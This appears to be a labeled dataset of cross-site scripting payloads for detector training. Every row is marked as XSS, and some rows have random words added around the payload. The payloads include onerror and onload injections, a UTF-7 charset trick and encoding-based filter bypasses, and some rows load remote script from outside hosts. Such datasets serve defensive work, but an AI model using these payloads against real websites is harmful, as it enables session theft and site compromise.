payload	xss
corotated <HEAD><META HTTP-EQUIV=&quotCONTENT-TYPE&quot CONTENT=&quottext/html; charset=UTF-7&quot> </HEAD>+ADw-SCRIPT+AD4-alert(&quotXSS&quot);+ADw-/SCRIPT+AD4-	1
poverty-stricken  &ltOBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html">&lt/OBJECT> choric	1
archenemies "'`><\x00img src=xxx:x onerror=javascript:alert(1)> strung	1
&quot'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>	1
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>	1
Hartstown "'`&gtABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';"&gtDEF 	1
fucker "'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 	1
legitimation "-eval("window['pro'%2B'mpt'](8)")-" McLaughlin	1
collector's &quot-prompt(8)-&quot	1
Hersey "/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />	1
Un-egyptian &quot/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />	1
underthought "/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /> MSSc	1
foliate "/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /> Lucias	1
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />	1
&quot/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />	1
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />	1
&quot/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />	1
inoxidability "/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />	1
semisimple &quot;a=prompt,a()//	1
yabbering "&gt<iframe%20src="http://google.com"%%203E	1
microcheiria "><img src=1 onerror=alert(1)>.gif apical	1
"&gt<img src=x onerror=prompt(1);&gt	1
psychophysical &quot>&ltimg src=x onerror=window.open('https://www.google.com/');> inversing	1
&quot>&ltlink rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;	1
harbingers-of-spring "&gt<script src=//brutelogic.com.br&sol;1.js&num;  appertise	1
">&ltscript src=data:&comma;alert(1)//	1
mercurified "><svg onload=alert(1)// backstamp	1
Tartarized &quot`'><script>-javascript:alert(1)</script>	1
misecclesiastic &quot`&quot>&ltscript>-javascript:alert(518)&lt/script>	1
swatches &quot`&quot><script>\x00javascript:alert(1)</script> logger	1
"`'&gt<script&gt\x00javascript:alert(511)</script&gt	1
blondish "`&quot><script>\x09javascript:alert(1)</script>	1
